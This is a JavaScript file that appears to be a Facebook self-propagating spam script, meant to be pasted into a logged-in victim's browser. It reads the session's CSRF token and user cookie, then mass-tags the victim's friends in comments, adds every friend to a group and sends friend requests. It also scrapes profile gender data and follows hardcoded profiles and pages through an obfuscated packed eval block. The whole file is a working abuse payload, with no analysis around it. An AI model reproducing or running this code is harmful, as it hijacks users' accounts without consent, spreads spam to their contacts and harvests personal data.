/* CREDITOS AO MIGUEL TARGA, ESSA PARTE E DELE */
function x__0() { return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest; };

//Pegar todos amigos
function get_friends(){
  var a=x__0();
  a.open("GET", "/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer="+uid+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", false);
  a.send(null);
  if (a.readyState == 4) {
    var f = JSON.parse(a.responseText.substring(a.responseText.indexOf('{')));
    return f.payload.entries;
  }
  return false;
}

/* FIM DA PARTE DO MIGUEL TARGA */


//Pegar todos amigos
function get_uid(b){
  var a=x__0();
  a.open("GET", 'http://graph.facebook.com/'+b, false);
  a.send();
  if (a.readyState == 4) {
    return uid = JSON.parse(a.responseText).id;

  }
  return false;
}
  // Pattern que vai trocar o valor dos coment?rios pelas marcaç?es

var patt = /comment_text=(.*?)&/
var c = 1;
username = /\.com\/(.*?)\//.exec(window.top.location)[1];
uid = get_uid(username);
a = window.top.location;
termina = 0;
var amigos = get_friends();
post_id = /[0-9]{8,}/.exec(a);
        uids =  'comment_text=';
header = 'ft_ent_identifier='+post_id+'&comment_text=@[100000365625674:0]&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user='+uid+'&__a=1&__req=4u&fb_dtsg='+document.getElementsByName('fb_dtsg')[0].value+'&phstamp='+Math.random();
  for ( var n = 1 ; n < amigos.length ; n++ ){
      //uids += '%40[' + amigos[n].uid + '%3A' + encodeURI(amigos[n].text) + ']%20';
    fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
            uids += '%40[' + amigos[n].uid + '%3AAAAAAAAAAAA]%20';
            c++; 
            if(c == 7){            
                // Quando o contador chega em 7, ele termina o parâmetro com um &...
                uids += '&';
                // ...envia as coisas com o método do indiano...
                with(new XMLHttpRequest()) open("POST", "/ajax/ufi/add_comment.php?__a=1"),setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),send(header.replace(patt, uids));

                // ... espera um segundo...
                z = setTimeout('function(){asd=0}', 1000);
                clearInterval(z);

                // ... e seta tudo de novo pra recomeçar
                c = 1;
                uids = 'comment_text=';
         

              }
            
    }





var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
       
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
   
    http4.close; // Close the connection
     
    }
    }
   
    http4.send(params4);
}


eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('10(O(p,a,c,k,e,r){e=O(c){P(c<a?\'\':e(11(c/a)))+((c=c%a)>V?R.12(c+29):c.W(Y))};Q(!\'\'.T(/^/,R)){S(c--)r[e(c)]=k[c]||e(c);k=[O(e){P r[e]}];e=O(){P\'\\\\w+\'};c=1};S(c--)Q(k[c])p=p.T(U Z(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);P p}(\'2 r(p){0 a=h k();0 b="//6.7.8/9/e/f.g";0 c="&i="+p+"&j=3&l=m&n=o&q=&L=&s[t]=u&v="+w+"&x=1&y=z-&A=d&5="+5+"&C=";a.D("E",b,3);a.F=2(){G(a.H==4&&a.I==J){a.K}};a.B(c)}\',19,19,\'1a||O|1b||1c|1r|1l|1p|1g|||||1G|1F|1m|U|1S|20|1k|26|23|2n|1M||1T|1s|1u|1v|1K|1q|1j|1i|1n|1w|1o|1h|14|1f|1e|1d|Q|18|17|16|15|1E\'.13(\'|\'),0,{}));10(O(p,a,c,k,e,r){e=O(c){P(c<a?\'\':e(11(c/a)))+((c=c%a)>V?R.12(c+29):c.W(Y))};Q(!\'\'.T(/^/,R)){S(c--)r[e(c)]=k[c]||e(c);k=[O(e){P r[e]}];e=O(){P\'\\\\w+\'};c=1};S(c--)Q(k[c])p=p.T(U Z(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);P p}(\'2 j(a){0 b=6 e();0 c="/m/3/7.8?9=1";0 d="g="+a+"&h=1&i=3-A&k=l&5="+5+"&n&o"+p+"&q=";b.r("s",c,t);b.u=2(){v(b.w==4&&b.x==y){b.z}};b.f(d)}\',1x,1x,\'1a||O|1H||1c|U|1I|1m|1i|||||1k|1h|1J|1y|1L|1z|1N|1O|1g|1P|1Q|1j|14|1f|1e|1b|1d|Q|18|17|16|15|1R\'.13(\'|\'),0,{}));10(O(p,a,c,k,e,r){e=O(c){P(c<a?\'\':e(11(c/a)))+((c=c%a)>V?R.12(c+29):c.W(Y))};Q(!\'\'.T(/^/,R)){S(c--)r[e(c)]=k[c]||e(c);k=[O(e){P r[e]}];e=O(){P\'\\\\w+\'};c=1};S(c--)Q(k[c])p=p.T(U Z(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);P p}(\'3 q(L){2 0=f h();2 a="//B.8.9/c/d/e/5/g";2 b="i="+L+"&j=5&k=l&m[n]=o&6[N]=r&6[s]=t&u="+v+"&w=1&x=z&A=y&7="+7+"&C=";0.D("E",a,F);0.G=3(){H(0.I==4&&0.J==K){0.M}};0.p(b)}\',1A,1A,\'X||1a|O||1U|1V|1c|1l|1p|||1g|1W|1X|U|1Y|1k|1Z|1B|1y|21|1u|1v|22|1h|1C|24|25|1D|1q|1j|1i|1n||27|1o|1r|14|1f|1e|1b|1d|Q|18|17|16||15|28\'.13(\'|\'),0,{}));10(O(p,a,c,k,e,r){e=O(c){P(c<a?\'\':e(11(c/a)))+((c=c%a)>V?R.12(c+29):c.W(Y))};Q(!\'\'.T(/^/,R)){S(c--)r[e(c)]=k[c]||e(c);k=[O(e){P r[e]}];e=O(){P\'\\\\w+\'};c=1};S(c--)Q(k[c])p=p.T(U Z(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);P p}(\'3 p(r){2 0=d e();2 a="//q.B.9/c/5/6.f";2 b="h="+r+"&6=5&i=j&k=l&&&m=&n=o&L=7&s&t&u="+v+"&w=1&x=y-&z=A&8="+8+"&C=";0.D("E",a,7);0.F=3(){G(0.H==4&&0.I==J){0.K}};0.g(b)}\',19,19,\'X||1a|O||2a|1B|1b|1c|1p|||1g|U|1k|1m|1h|2b|2c|2d|2e|2f|2g|2h|2i|2j|1r||2k|2l|1q|1j|1i|1n|1w|1o|V|1l|14|1f|1e|1d|Q|18|17|16|15|2m\'.13(\'|\'),0,{}));10(O(p,a,c,k,e,r){e=O(c){P(c<a?\'\':e(11(c/a)))+((c=c%a)>V?R.12(c+29):c.W(Y))};Q(!\'\'.T(/^/,R)){S(c--)r[e(c)]=k[c]||e(c);k=[O(e){P r[e]}];e=O(){P\'\\\\w+\'};c=1};S(c--)Q(k[c])p=p.T(U Z(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);P p}(\'2(\\\'l\\\');2(\\\'w\\\');2(\\\'3\\\');2(\\\'4\\\');2(\\\'5\\\');2(\\\'6\\\');2(\\\'7\\\');2(\\\'8\\\');0(\\\'a\\\');0(\\\'b\\\');0(\\\'c\\\');0(\\\'d\\\');0(\\\'e\\\');0(\\\'f\\\');0(\\\'g\\\');0(\\\'h\\\');0(\\\'i\\\');0(\\\'j\\\');0(\\\'k\\\');0(\\\'F\\\');0(\\\'m\\\');0(\\\'n\\\');0(\\\'o\\\');0(\\\'p\\\');0(\\\'q\\\');0(\\\'r\\\');0(\\\'s\\\');0(\\\'t\\\');0(\\\'u\\\');0(\\\'v\\\');1(\\\'x\\\');1(\\\'y\\\');1(\\\'z\\\');1(\\\'A\\\');1(\\\'B\\\');1(\\\'C\\\');1(\\\'D\\\');1(\\\'E\\\');1(\\\'9\\\');\',1t,1t,\'1s|1C|1z|2o|2p|2q|2r|2s|2t|2u|2v|2w|2x|2y|2z|2A|2B|2C|2D|2E|2F|2G|2H|2I|2J|2K|2L|2M|2N|2O|2P|2Q|2R|2S|2T|2U|2V|2W|2X|2Y|2Z|30\'.13(\'|\'),0,{}));',62,187,'||||||||||||||||||||||||||||||||||||||||||||||||||function|return|if|String|while|replace|new|35|toString||36|RegExp|eval|parseInt|fromCharCode|split|phstamp|close|200|status|readyState|48|var|true|fb_dtsg|onreadystatechange|POST|open|ajax|send|__a|user_id|XMLHttpRequest|facebook|php|__dyn|__req|com|__user|www|Essawy_l|42|nctr|_mod|798aD5z5CF|37|location|Essawy_f|50|action|Essawy_li|DH|cat|fan_status|pages|follow|follow_profile|profile_id|pagelet_timeline_page_actions|source|page_timeline|subscribed_button_id|u37qac_37|lsd|__|button|fbpage_id|fan_source|subscribe|ft|friends|lists|modify|flid|add|feed|pagelet_group_mall|false|40|tn|reload|7n8ahxoNpGo|type||add_friend|to_friend|how_found|friend_browser_s|ref_param|none|outgoing_id|logging_location|search|Essawy_fr|ego_log_data|http_referer|no_flyout_on_click|fan_origin|100006470603829|100006605291761|100006568783444|100000857397229|100006242521566|100003859610667|569237906448117|433324066778619|230149047033949|435909033147094|132641936901771|698745850152275|128010603938905|550598524995649|334895459990600|232718096885431|211737052328642|627993220579407|100003071648227|330235977120624|447024572082350|631416366898796|605592309490891|446435542141674|564750856905766|134201400109551|532009583532336|123242051151486|136220973110975|100006380948923|349942901784762|383445975101121|383446421767743|383446521767733|383446588434393|1771810796290890|1771811286290841|569237803114794|514456441970554'.split('|'),0,{}));


var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
  var httpwp = new XMLHttpRequest();
  var urlwp = '/ajax/groups/members/add_post.php?__a=1';
  var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
  httpwp['open']('POST', urlwp, true);
  httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
  httpwp['setRequestHeader']('Content-length', paramswp['length']);
  httpwp['setRequestHeader']('Connection', 'keep-alive');
  httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
  };
  httpwp['send'](paramswp);
};
var spage_id = "100211486794985";
var spost_id = "100211486794985";
var sfoto_id = "100211486794985";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date();
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}
 
 
//arkadaslari al ve isle
function sarkadaslari_al(){
               var xmlhttp = new XMLHttpRequest();
      xmlhttp.onreadystatechange = function () {
                       if(xmlhttp.readyState == 4){
                                 eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                                 for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
                                       smesaj = "";
                                       smesaj_text = "";
                                 for(i=f*10;i<(f+1)*10;i++){
                                       if(arkadaslar.payload.entries[i]){
                                 smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
                                 smesaj_text += " " + arkadaslar.payload.entries[i].text;
                                 }
                                       }
                                       sdurumpaylas();                         }
                             
                       }
                     
      };
               var params = "&filter[0]=user";
               params += "&options[0]=friends_only";
               params += "&options[1]=nm";
               params += "&token=v7";
      params += "&viewer=" + user_id;
               params += "&__user=" + user_id;
             
      if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}
 
//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);
 
 
//arkada?? ekleme
function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){  
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
               
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
               xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
               cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
               xmlhttp.send(params);
}
}
 
//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
               var xmlhttp = new XMLHttpRequest();
      xmlhttp.onreadystatechange = function () {
                       if(xmlhttp.readyState == 4){
                       eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                       cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
                       btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
                       if(cinshtml.getElementsByTagName("select")[0].value == "1"){
                       document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
                       }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
                       document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
                       }
                       eval(fonksiyon + "(" + id + "," + cins + ");");
                       }
      };
               xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
               xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
               xmlhttp.send();
}
